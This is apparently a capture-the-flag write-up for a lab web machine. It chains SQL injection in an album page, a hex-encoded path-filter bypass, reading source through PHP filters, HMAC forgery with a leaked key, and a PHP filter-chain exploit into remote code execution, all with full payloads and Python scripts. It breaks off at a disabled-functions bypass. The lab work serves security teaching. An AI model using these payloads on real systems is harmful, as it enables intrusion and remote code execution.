

[http://10.113.177.115/album.php?short_tag=fav;1=1](https://www.google.com/url?sa=E&q=http%3A%2F%2F10.113.177.115%2Falbum.php%3Fshort_tag%3Dfav%3B1%3D1)

Hacking attempt

[http://10.113.177.115/album.php?short_tag=user%27%20ORDER%20BY%201--%20-](https://www.google.com/url?sa=E&q=http%3A%2F%2F10.113.177.115%2Falbum.php%3Fshort_tag%3Duser%2527%2520ORDER%2520BY%25201--%2520-)

Warning: Trying to access array offset on false in /var/www/html/album.php on line 32  
Connection failed: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1

?short_tag=user' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -  
Connection failed: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'images' at line 1

[http://10.113.177.115/album.php?short_tag=user%27%20OR%201=1--%20-](https://www.google.com/url?sa=E&q=http%3A%2F%2F10.113.177.115%2Falbum.php%3Fshort_tag%3Duser%2527%2520OR%25201%3D1--%2520-)  
this retrieves the normal page

So, it is most likely that after the application fetches the album `id` with the `**SELECT id from albums where short_tag = '<short_tag>'**` query, it runs another query like `**SELECT * from images where album_id = <album_id>**`, with the `album_id` being the result of the previous query, and there is a chance that the `album_id` in this second query (which comes directly as the result of the first query) is not sanitized, just like the `short_tag` in the previous query, once again allowing **SQL injection**.

We don’t know if the application exactly works this way, but we can simply test it. First, using a payload like `sornphut' UNION SELECT 0-- -` on the `short_tag` variable for **album.php** with the request `http://10.10.152.169/album.php?short_tag=sornphut' UNION SELECT 0-- -`, we can see that we are able to control the `album_id` returned by the query.

Now, instead of an `id`, with a payload like `sornphut' UNION SELECT "0 OR 1=1-- -"-- -`, we can make the first query return `**0 OR 1=1-- -**` as the album `id`, and if our theory is right, the second query would be something like `**SELECT * from images where album_id=0 OR 1=1-- -**`, which would cause all the images to be displayed. Testing this, we can see that it works exactly as we hoped.

Next, trying a **UNION**-based payload to control the `path` returned by the second query, we are successful with three columns using the payload `sornphut' UNION SELECT "0 UNION SELECT 1,2,3-- -"-- -`, and we can see that the third column is the `path`

Now, trying to set the `path` as `/etc/passwd` to force **album.php** to calculate the hash for this path and use it at **/image.php** to read it, with the payload `sornphut' UNION SELECT "0 UNION SELECT 1,2,'/etc/passwd'-- -"-- -`, we once again encounter the **Hacking attempt** error, as `/` is a filtered character.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*fKHlLXd-eRlMEXJA5W_8Ow.png)

view-source:[http://moebius.thm/album.php?short_tag=sornphut%27%20UNION%20SELECT%20%220%20UNION%20SELECT%201,2,%27/etc/passwd%27--%20-%22--%20-](http://moebius.thm/album.php?short_tag=sornphut%27+UNION+SELECT+%220+UNION+SELECT+1%2C2%2C%27%2Fetc%2Fpasswd%27--+-%22--+-)

However, this is not really a problem, as we can simply **hex encode** the `/etc/passwd` to bypass the filter with the payload: `sornphut' UNION SELECT "0 UNION SELECT 1,2,0x2f6574632f706173737764-- -"-- -`. We can see that this works, and we get the calculated hash for `/etc/passwd` as `9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d`.

## Reading Application Files

At this point, since we are able to include arbitrary files, we could attempt log poisoning to escalate the LFI into RCE. However, we are unable to find a suitable log file to poison.

Instead, we can use a PHP wrapper like `php://filter/convert.base64-encode/resource=` to read and enumerate application files.

First, we convert `php://filter/convert.base64-encode/resource=album.php` to hexadecimal (`7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870`) and craft the following payload:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*PXxTfY-zx1UAaKBTi6jgQg.png)

sornphut' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870-- -"-- -

This forces the application to calculate the hash for the path `php://filter/convert.base64-encode/resource=album.php`.

http://10.113.177.115/album.php?short_tag=none%27%20UNION%20SELECT%20%220%20UNION%20SELECT%201,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870--%20-%22--%20-

This forces the application to calculate the hash for the path `php://filter/convert.base64-encode/resource=album.php`.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*lBBP0H2333-t4q6Op_yOBQ.png)

view-source:[http://moebius.thm/album.php?short_tag=sornphut%27%20UNION%20SELECT%20%220%20UNION%20SELECT%201,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870--%20-%22--%20-](http://moebius.thm/album.php?short_tag=sornphut%27+UNION+SELECT+%220+UNION+SELECT+1%2C2%2C0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870--+-%22--+-)

With the calculated hash, we are able to read the source code of `album.php` as such:

curl -s 'http://moebius.thm/image.php?hash=ec6e518b7e39db98affbf2bf2c671d469639503d

Now that we have the `SECRET_KEY`, we can easily calculate valid HMAC-SHA256 hashes for any path we want. Here’s a simple Python script to automate this:
```python
import hmac  
import hashlib  
import sys  
  
secret_key = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"  
path = sys.argv[1].encode()  
h = hmac.new(secret_key, path, hashlib.sha256)  
signature = h.hexdigest()  
print(signature)

```
## PHP Filters Chain Exploitation

To turn this **LFI** vulnerability into **RCE**, another method besides log poisoning is to use **PHP filters chain**. This technique allows us to combine multiple filters to ultimately create a “file” containing whatever content we want and include it — in this case, **PHP code**.

We can generate a filter chain using [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) by **Synacktiv**:

python3 ./php_filter_chain_generator.py --chain '<?=eval($_GET[0])?>'

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*NlX8IRuq_IrQCSLSk3GSVg.png)

To make exploitation easier, we can write a simple script to execute arbitrary PHP code on the target:
```python
import hmac  
import hashlib  
import requests  
  
target_url = "http://moebius.thm/image.php" # change the IP address  
  
secret_key = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"  
path = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp".encode() # replace with the output of php_filter_chain_generator.py   
h = hmac.new(secret_key, path, hashlib.sha256)  
signature = h.hexdigest()  
  
while True:  
    params = {  
        "hash": signature,  
        "path": path,  
        "0": input("code> ")  
    }  
    resp = requests.get(target_url, params=params, timeout=5)  
    text = resp.text  
    print(text)
```
However, when trying to execute the `system()` function to achieve RCE, we encounter the following error:

python3 execute_code.py

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*mJHEM8JmGwaqKVGYmJj5Pg.png)
Checking the disabled PHP functions confirms why — `system` (along with many others) is disabled:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*tSw615xqbI1bosZBNGqLFA.png)

## Disabled Functions Bypass

It seems that any major function that could help us execute commands on the target has been disabled. However, if we look for ways to bypass disabled functions, we may come across an [interesting method](https://hacktricks.boitatech.com.br/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#ld_preload-bypass) utilizing the `putenv` and `mail` functions.